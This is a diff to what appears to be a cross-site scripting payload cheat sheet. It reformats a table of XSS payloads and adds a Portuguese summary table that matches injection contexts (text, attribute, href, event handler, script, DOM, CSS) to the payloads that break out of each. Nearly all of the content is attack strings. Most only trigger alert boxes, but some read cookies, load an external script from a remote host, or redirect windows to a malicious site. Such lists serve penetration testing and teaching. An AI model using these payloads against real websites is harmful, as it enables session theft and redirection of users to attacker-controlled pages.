@@ -15,19 +15,19 @@ Some XSS payloads may be blocked by security systems, or the payloads sent may n
 In such cases, different payloads with varying functionalities can be used.
 
 | Payload	Description
-<script>alert('XSS')</script>	Displays a simple alert box, verifying that XSS is working.
-<script>alert(document.cookie)</script>	Shows the user's cookie information.
-<script>alert(document.domain)</script>	Displays the domain information of the page.
-<img src="x" onerror="alert('XSS')">	Executes the alert function due to a failed image load.
-<svg/onload=alert('XSS')>	Executes the alert function when an SVG graphic loads.
-"><script>alert('XSS')</script>	Executes a script within an unclosed HTML tag.
-<body onload=alert('XSS')>	Executes a script when the body tag loads.
-<iframe src="javascript:alert('XSS')">	Runs JavaScript code within an iframe.
-<input type="text" value="<script>alert('XSS')</script>">	Injects a script into an input field.
-javascript:alert('XSS')	Directly executes JavaScript code through a link.
-onmouseover="alert('XSS')"	Executes a script when the mouse hovers over an element.
-"><iframe src="javascript:alert('XSS')"></iframe>	Runs malicious JavaScript within an iframe.
-<script src="http://example.com/malicious-code.js"></script>	Loads and executes an external JavaScript file.
+| <script>alert('XSS')</script>	| Displays a simple alert box, verifying that XSS is working.
+| <script>alert(document.cookie)</script>	| Shows the user's cookie information.
+| <script>alert(document.domain)</script>	| Displays the domain information of the page.
+| <img src="x" onerror="alert('XSS')">	| Executes the alert function due to a failed image load.
+| <svg/onload=alert('XSS')>	| Executes the alert function when an SVG graphic loads.
+| "><script>alert('XSS')</script>	| Executes a script within an unclosed HTML tag.
+| <body onload=alert('XSS')>	| Executes a script when the body tag loads.
+| <iframe src="javascript:alert('XSS')">	| Runs JavaScript code within an iframe.
+| <input type="text" value="<script>alert('XSS')</script>">	| Injects a script into an input field.
+| javascript:alert('XSS')	| Directly executes JavaScript code through a link.
+| onmouseover="alert('XSS')"	| Executes a script when the mouse hovers over an element.
+| "><iframe src="javascript:alert('XSS')"></iframe>	| Runs malicious JavaScript within an iframe.
+| <script src="http://example.com/malicious-code.js"></script>	| Loads and executes an external JavaScript file.
 "><img src="javascript:alert('XSS')">	Executes JavaScript code through an image element.
 <div style="background:url('javascript:alert('XSS')')"></div>	Executes JavaScript code within CSS.
 <script>document.write('<img src="x" onerror="alert('XSS')">')</script>	Writes a script onto the document and executes XSS.
@@ -57,3 +57,14 @@ onmouseover="alert('XSS')"	Executes a script when the mouse hovers over an eleme
 <script>top.location=document.referrer;</script>	Redirects the page source to the top frame.
 <script>window.opener.location='http://malicious.com';</script>	Redirects the main page of a newly opened window to a malicious site.
 <script>window.parent.location='http://malicious.com';</script>	Redirects the parent window to a malicious site.
+
+
+ 📊 Tabela Resumida (Contexto → Payloads)
+| Contexto	| Exemplo refletido	|Payload comum
+| Texto	| <p>TESTE</p>	| <script>alert(1)</script>
+| Atributo	| <input value="TESTE">	| " autofocus onfocus=alert(1) x="
+| Href/src	| <a href="TESTE">	| javascript:alert(1)
+| Evento	| <input onmouseover="TESTE">	| alert(1)
+| Script	| var x = "TESTE";	| ";alert(1);//
+| DOM (URL)	| document.write(location.search)	| ?q=<img src=x onerror=alert(1)>
+| CSS/style	| <div style="color:TESTE;">	| " onmouseover=alert(1) x="
